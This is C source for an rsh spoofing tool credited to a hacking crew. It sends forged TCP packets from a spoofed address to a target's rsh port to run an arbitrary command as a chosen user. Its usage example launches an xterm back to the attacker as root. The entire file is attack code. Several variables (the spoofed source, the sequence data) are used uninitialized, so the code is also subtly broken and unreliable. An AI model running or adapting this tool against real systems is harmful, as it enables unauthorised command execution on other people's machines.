/*
 *	OrganiKs Crew | Rsh spoofing by Lionel
 *	Ripped code : vxmbomb.c ( of vector'S )  
*/

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <netdb.h> 
#include "packet.h"

#define NUMTESTS 10
char cmmd[400]; 

struct seqz {
  unsigned long seq;
  unsigned long ack;
  unsigned short sport;
};

int compar(const void *a, const void *b)
{
  int *aa, *bb;

  aa=(int *) a;
  bb=(int *) b;

  return (*aa - *bb);
}

unsigned long lookup(char *host)
{
  struct hostent *ho;
  struct sockaddr_in sin;
  unsigned long address;
  char temp[80];
  int err;
  
  ho=gethostbyname(host);
  if (ho) {
    memcpy((caddr_t)&sin.sin_addr, ho->h_addr, ho->h_length);
    address=sin.sin_addr.s_addr;
    return(address);
  } else {perror("cannot resolve host");exit(1);}
}

int randnum(int range) { return(rand()%range); }

char *rand_ip(char *ptr)
     {
        sprintf(ptr, "%d.%d.%d.%d", randnum(255), randnum(255), randnum(255),
                randnum(255));
        return ptr;
     }

struct seqz gettcppktnfoz(sock,src,dst,sport,dport,flagz)
unsigned long src,dst;
unsigned short sport,dport;
unsigned char flagz;
int sock;
{
  struct seqz seqpacket;
  struct iphdr *ip;
  struct tcphdr *tcp;
  char buf[8192];
  int len;

  for (;;) {
    gettcppkt(sock,buf,sizeof(buf));
    ip = (struct iphdr *) buf;
    if (ip->saddr != src) continue;
    if (ip->daddr != dst) continue;
    len = ip->ihl << 2;
    tcp = (struct tcphdr *) (buf+len);
/*    if (ntohs(tcp->th_sport) != sport) continue;*/
    if (ntohs(tcp->th_dport) != dport) continue;
    if (tcp->th_flags==flagz) break;
  }
  seqpacket.seq=ntohl(tcp->th_seq);
  seqpacket.ack=ntohl(tcp->th_ack);
  seqpacket.sport=ntohs(tcp->th_sport);
  return(seqpacket);
}

main(argc,argv)
int argc;
char *argv[];
{
  struct seqz seqpacket;
  struct sockaddr_in sin;
  unsigned long identack,spf,src,dst,seq,ack,lseq,seqrec[NUMTESTS], seqadd;
  unsigned short sport,dport,identport;
  unsigned long diff;
  int i, tcpsock, outsock, insock, olen, kurrent=0;
  char outbuf[256], spoofstr[256];

  printf("OrganiKs Crew\n");
  printf("Rsh Spoofing by Lionel\n");
  if (argc!=7) {
    printf("Usage: %s <src ip> <dst ip> <port> <cmd> <userlocal>
<userremote>\n",argv[0]);
    printf("exemple: %s 127.0.0.1 127.0.0.1 514 \"/usr/X11R6/bin/xterm
-display 127.0.0.1:0\" root root\n", argv[0]);      
  exit(0);
   }
  outsock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if(outsock<0){perror("outsock");exit(1);}
  insock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
  if(outsock<0){perror("insock");exit(1);}
  tcpsock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(outsock<0){perror("tcpsock");exit(1);}
  dport=atoi(argv[3]);
  sport=randnum(45555)+1000; 
  src=lookup(argv[1]);
  dst=lookup(argv[2]);
  strcpy(cmmd,argv[4]); 
  seq=31338890;
  ack=seqpacket.seq+seqadd;
  printf("Connexion ouverte\n");
  printf("envoie SYN falg\n");
  sendtcppkt(outsock,spf,dst,sport,dport,seq,0,TH_SYN,NULL,0);
  usleep(10000);
  printf("envoie ACK flag\n");
  sendtcppkt(outsock,spf,dst,sport,dport,++seq,++ack,TH_ACK,NULL,0);
  usleep(5000);
  sprintf(outbuf,"%s\n%s\n", argv[5], argv[6]);
  olen=strlen(outbuf);
  printf("envoie userlocal et userremote\n");
    sendtcppkt(outsock,spf,dst,sport,dport,seq,ack,TH_ACK|TH_PUSH,outbuf,olen);
    seq+=olen;
    usleep(5000);
  printf("envoie cmd:\n");
  printf("%s\n", cmmd);
  sprintf(outbuf,"%s\n", cmmd);
  olen=strlen(outbuf);
  sendtcppkt(outsock,spf,dst,sport,dport,seq,ack,TH_ACK|TH_PUSH,outbuf,olen);
  seq+=olen;
  usleep(5000);
  sleep(1);
  printf("envoie FIN flag\n");
  sendtcppkt(outsock,spf,dst,sport,dport,++seq,++ack,TH_FIN,NULL,0);
  printf("Connexion termin�\n");
}
